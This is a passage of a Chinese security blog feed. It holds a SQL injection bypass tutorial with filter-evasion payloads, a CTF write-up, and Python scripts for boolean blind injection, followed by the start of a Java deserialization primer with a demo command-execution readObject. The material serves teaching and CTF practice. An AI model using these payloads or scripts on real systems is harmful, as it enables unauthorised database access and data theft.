plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据</span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prepare xxx from &quot;sql语句&quot;;</span><br><span class="line">execute xxx;</span><br><span class="line"></span><br><span class="line">由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤</span><br><span class="line">比如过滤了select</span><br><span class="line">PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></figure><h3 id="information-schema被过滤"><a href="#information-schema被过滤" class="headerlink" title="information_schema被过滤"></a>information_schema被过滤</h3><p>方法一：</p><p>利用mysql5.7新增的<code>sys.schema_auto_increment_columns</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</span><br></pre></td></tr></table></figure><p>方法二：</p><p>利用<code>sys.schema_table_statistics_with_buffer</code></p><p>方法三：</p><p>利用mysql默认存储引擎innoDB携带的表 <code>mysql.innodb_table_stats</code>和</p><p>  <code>mysql.innodb_index_stats</code></p><p>方法四：</p><p>无列名注入</p><h4 id="join-using注列名"><a href="#join-using注列名" class="headerlink" title="join-using注列名"></a>join-using注列名</h4><p>通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span><br><span class="line">获取第一列的列名</span><br><span class="line">?id=-1&#x27; union all select * from (select * from users as a join users as b)as c--+</span><br><span class="line">获取次列及后续列名</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username))c--+</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username,password))c--+</span><br><span class="line">数据库中as主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。</span><br></pre></td></tr></table></figure><h4 id="利用普通子查询"><a href="#利用普通子查询" class="headerlink" title="利用普通子查询"></a>利用普通子查询</h4><p>假设 <code>user</code>表中存在 列名为<code>id</code>、<code>name</code>、<code>pass</code>、<code>mail</code>、<code>phone</code>，那么利用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 union select * from users; （前提是先尝试出sql中总共有几个列）</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170246019-1523606623.png" alt="image-20220322170246440"></p><p>可见数字与users中的列相应，接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3,4,5 union select * from users)a;</span><br><span class="line">//就相当于select pass from (select 1,2,3,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170339848-796249324.png" alt="image-20220322170340541"></p><p>当反引号 &#96; 不能使用的时候，我们可以使用别名来代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br><span class="line">select group_concat(b,c) from (select 1,2,3 as b,4 as c,5 union select * from users)a;  //在注入中查询多个列：</span><br></pre></td></tr></table></figure><p>过滤了逗号，可以利用join</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>这里列举一个之前参加的中国工业互联网安全大赛联通赛题的一道无列名注入题</p><p>题目就一个登录页面，过滤的源码如下，实际环境可以采⽤fuzz，对常⽤关键字进⾏探测，将被过滤的找出来 </p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170811575-724738630.png" alt="image-20220322170812383"></p><p>通过观察，过滤中最主要将各种用于比较的符号都进行了过滤，只留下了⼀个就是in<br>并且登录接，sql没有回显，明显是布尔盲注，经过测试，payload如下：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:</span><br><span class="line">abcabc&#x27;/**/or/**/ord(mid((select/**/database()),0,1))/**/in/**/(&#x27;127&#x27;)#</span><br></pre></td></tr></table></figure><p>还有⼀个考点就是这里过滤了<code>information</code>，表面上看没办法常规获取表明和字段名，这里采用的绕过方法是使用<code>sys.schema_table_statistics</code>这个表。这个表中存储了所有的数据库和数据表，但是没有字段名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;xxx&#x27;) GROUP BY table_name limit 0,1</span><br></pre></td></tr></table></figure><p>利用无列名注入获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1</span><br></pre></td></tr></table></figure><p>或者想办法获取列名：这里采取的⽅式为:sys.x$statement_analysis这个表，这个表会记录最近用过的语句，因为题目环境为docker，因此建表语句⼀般都存储在该表中，没有被清空，因此可以通过注入这个表，获取到完整的建表语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT query FROM sys.x$statement_analysis</span><br></pre></td></tr></table></figure><p>编写python脚本，获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">url = &#x27;http://127.0.0.1:8081/index.php&#x27;</span><br><span class="line"></span><br><span class="line">select = &#x27;password&#x27; #flag-is-not-here</span><br><span class="line">select = &#x27;SELECT table_schema FROM sys.schema_table_statistics GROUP BY</span><br><span class="line">table_schema&#x27; #ctfgame 库名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 0,1&quot; # f1a91sH3RE 表名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 1,1&quot; # users</span><br><span class="line">select = &quot;SELECT query FROM sys.x$statement_analysis limit 3,1&quot; # users</span><br><span class="line">select = &quot;SELECT f1aG123 FROM f1a91sH3RE&quot;</span><br><span class="line"># select = &quot;select * from f1a91sH3RE limit 0,1&quot; #注⼊失败 说明不⽌⼀列</span><br><span class="line"># select = &quot;select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1&quot; #假设有2列 注⼊成功 flag&#123;af65039d-6f2f-9524-d896-e630d03c074c&#125;</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">for j in range(1,130):</span><br><span class="line">data=&#123;</span><br><span class="line">&#x27;username&#x27; : &#x27;admin&#x27;,</span><br><span class="line">&#x27;password&#x27; : f&quot;abcabc&#x27; or ord(mid((&#123;select&#125;),&#123;i&#125;,1)) in</span><br><span class="line">(&#x27;&#123;j&#125;&#x27;)#&quot;.replace(&#x27; &#x27;, &quot;/**/&quot;)</span><br><span class="line">&#125; </span><br><span class="line">r = req.post(url, data)</span><br><span class="line">if &#x27;hacker&#x27; in r.text:</span><br><span class="line">print(&quot;hacker&quot;)</span><br><span class="line">exit(0)</span><br><span class="line">if &#x27;wrong&#x27; not in r.text:</span><br><span class="line">res += chr(j)</span><br><span class="line">print(res)</span><br><span class="line">break</span><br><span class="line">if j == 129:</span><br><span class="line">exit(0)</span><br></pre></td></tr></table></figure><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#    %23    --+或-- -    ;%00      用引号进行闭合</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure><h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><h3 id="过滤比较符号绕过"><a href="#过滤比较符号绕过" class="headerlink" title="过滤比较符号绕过"></a>过滤比较符号绕过</h3><p>使用 in() 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;ip/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure><p>使用like绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>使用regexp绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">https://blog.csdn.net/qq_45521281/article/details/106647880</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;</summary>
    
    
    
    <category term="Web安全" scheme="https://kpa1on.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="注入" scheme="https://kpa1on.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://kpa1on.github.io/2022/03/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kpa1on.github.io/2022/03/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-22T02:21:00.000Z</published>
    <updated>2022-03-22T06:24:50.624Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="序列化与反序列化基础"><a href="#序列化与反序列化基础" class="headerlink" title="序列化与反序列化基础"></a>序列化与反序列化基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Java序列化是指把Java对象转换为字节序列的过程；</p><p>Java反序列化是指把字节序列恢复为Java对象的过程；</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322102503916-1102489201.png" alt="image-20220322102504287"></p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>序列化最重要的作用：在传递和保存对象时，保证对象的完整性和可传递性。对象转换为有序字节流，以便在网络上传输或者保存在本地文件中。</p><p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p><p>   总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p><p>优点：</p><p>①将对象转为字节流存储到硬盘上，当JVM停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。</p><p>②序列化成字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。</p><p>③通过序列化可以在进程间传递对象。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>只有实现了<code>Serializable</code>或者<code>Externalizable</code>接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p><p>JDK中序列化和反序列化的API：</p><ol><li><code>java.io.ObjectInputStream</code>：对象输入流。该类的<code>readObject()</code>方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</li><li><code>java.io.ObjectOutputStream</code>：对象输出流。该类的<code>writeObject(Object obj)</code>方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</li></ol><p>三种实现：</p><ol><li><p>若Student类仅仅实现了<code>Serializable</code>接口，则可以按照以下方式进行序列化和反序列化.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化。 </span><br><span class="line">ObjcetInputStream采用默认的反序列化方式，对Student对象的非transient的实例变量进行反序列化</span><br></pre></td></tr></table></figure></li><li><p>若Student类仅仅实现了<code>Serializable</code>接口，并且还定义了<code>readObject(ObjectInputStream in)</code>和<code>writeObject(ObjectOutputSteam out)</code>，则按照以下方式进行序列化与反序列化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化。 </span><br><span class="line">ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化。</span><br></pre></td></tr></table></figure></li><li><p>若Student类实现了<code>Externalnalizable</code>接口，且Student类必须实现<code>readExternal(ObjectInput in)</code>和<code>writeExternal(ObjectOutput out)</code>方法，则按照以下方式进行序列化与反序列化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化。 </span><br><span class="line">ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化。</span><br></pre></td></tr></table></figure></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package ser;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">class serdemo implements Serializable&#123;</span><br><span class="line">   private String name;</span><br><span class="line">   public String getName()&#123;</span><br><span class="line">       return name;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setName(String name)&#123;</span><br><span class="line">      this.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class serdemo1 &#123;</span><br><span class="line">    public static void main(String args[]) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        #序列化</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;seri.txt&quot;);</span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        serdemo serdemo=new serdemo();</span><br><span class="line">        serdemo.setName(&quot;test&quot;);</span><br><span class="line">        outputStream.writeObject(serdemo);</span><br><span class="line">        #反序列化</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(&quot;seri.txt&quot;);</span><br><span class="line">        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">        serdemo object2 = (serdemo) inputStream.readObject();</span><br><span class="line">        System.out.println(&quot;反序列化后的对象的值&quot;);</span><br><span class="line">        System.out.println(object2.getName());</span><br><span class="line">        inputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol><li>序列化时，只对对象的状态进行保存，而不管对象的方法；</li><li>当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；</li><li>当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；</li><li>并非所有的对象都可以序列化；</li><li>声明为static和transient类型的成员数据不能被序列化。因为static代表类的状态，transient代表对象的临时数据；</li><li>如果一个对象的成员变量是一个对象，那么这个对象的数据成员也会被保存。</li></ol><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在Java反序列化中，会调用被反序列化的<code>readObject</code>方法，当<code>readObject</code>方法被重写不当时产生漏洞，这里为什么会调用反序列化类的<code>readobject</code>方法，后续做分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class demon &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        //序列化</span><br><span class="line">        //定义myObj对象</span><br><span class="line">        MyObject myObj = new MyObject();</span><br><span class="line">        myObj.name = &quot;test&quot;;</span><br><span class="line">        //创建一个包含对象进行反序列化信息的”object”数据文件</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(&quot;object&quot;));</span><br><span class="line">        //writeObject()方法将myObj对象写入object文件</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        //反序列化</span><br><span class="line">        //从文件中反序列化obj对象</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;object&quot;));</span><br><span class="line">        //恢复对象</span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    static class MyObject implements Serializable &#123;</span><br><span class="line">        public String name;</span><br><span class="line">        //重写readObject()方法</span><br><span class="line">        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">            //执行默认的readObject()方法</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            //执行打开计算器程序命令</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基础库中存在的反序列化漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 